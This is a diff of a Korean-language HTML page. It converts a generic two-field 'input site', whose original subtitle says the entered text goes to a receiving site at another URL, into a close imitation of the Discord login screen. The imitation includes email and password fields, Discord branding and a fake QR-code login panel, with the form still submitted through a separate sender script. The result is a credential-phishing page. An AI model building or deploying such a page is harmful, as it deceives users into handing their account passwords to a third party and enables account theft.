@@ -1,42 +1,60 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="ko">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>입력 사이트</title>
+  <title>Discord</title>
   <link rel="stylesheet" href="sender.css">
 </head>
 <body>
+  <div class="scene" aria-hidden="true">
+    <span class="planet planet-left"></span>
+    <span class="planet planet-top"></span>
+    <span class="planet planet-right"></span>
+    <span class="star star-a"></span>
+    <span class="star star-b"></span>
+    <span class="star star-c"></span>
+  </div>
+
+  <header class="brand" aria-label="Discord">
+    <div class="brand-mark">Discord</div>
+  </header>
+
   <main>
-    <header>
-      <h1>입력 사이트</h1>
-      <p class="subtitle">두 칸에 글자를 입력하고 확인을 누르면 다른 URL의 받는 사이트로 전송됩니다.</p>
-    </header>
+    <form id="sendForm" class="login-card">
+      <section class="login-panel" aria-label="로그인">
+        <div class="welcome">
+          <h1>돌아오신 것을 환영해요!</h1>
+          <p>다시 만나다니 너무 반가워요!</p>
+        </div>
 
-    <form id="sendForm">
-      <div class="form-head">
-        <h2>보낼 글자 입력</h2>
-      </div>
+        <label for="textOne">이메일 또는 전화번호 <span>*</span></label>
+        <input id="textOne" name="textOne" type="text" autocomplete="username">
 
-      <div class="grid">
-        <section>
-          <label for="textOne">첫 번째 글자</label>
-          <textarea id="textOne" placeholder="첫 번째로 보낼 글자를 입력하세요."></textarea>
-        </section>
+        <label for="textTwo">비밀번호 <span>*</span></label>
+        <input id="textTwo" name="textTwo" type="password" autocomplete="current-password">
 
-        <section>
-          <label for="textTwo">두 번째 글자</label>
-          <textarea id="textTwo" placeholder="두 번째로 보낼 글자를 입력하세요."></textarea>
-        </section>
-      </div>
+        <a class="forgot" href="#">비밀번호를 잊으셨나요?</a>
+        <button type="submit">로그인</button>
 
-      <div class="actions">
+        <div class="join-row">
+          <span>계정이 필요한가요?</span>
+          <a href="#">가입하기</a>
+        </div>
+
         <div class="status" id="status" aria-live="polite"></div>
-        <button type="submit">확인</button>
-      </div>
+      </section>
+
+      <aside class="qr-panel" aria-label="QR 코드 로그인">
+        <div class="qr-code"><img src="qr.png" alt="QR 코드"></div>
+        <h2>QR 코드로 로그인</h2>
+        <p><strong>Discord 모바일 앱</strong>으로 스캔해 바로 로그인하세요.</p>
+        <a href="#">또는, 패스키로 로그인하세요</a>
+      </aside>
     </form>
   </main>
 
   <script src="sender.js"></script>
 </body>
 </html>
+
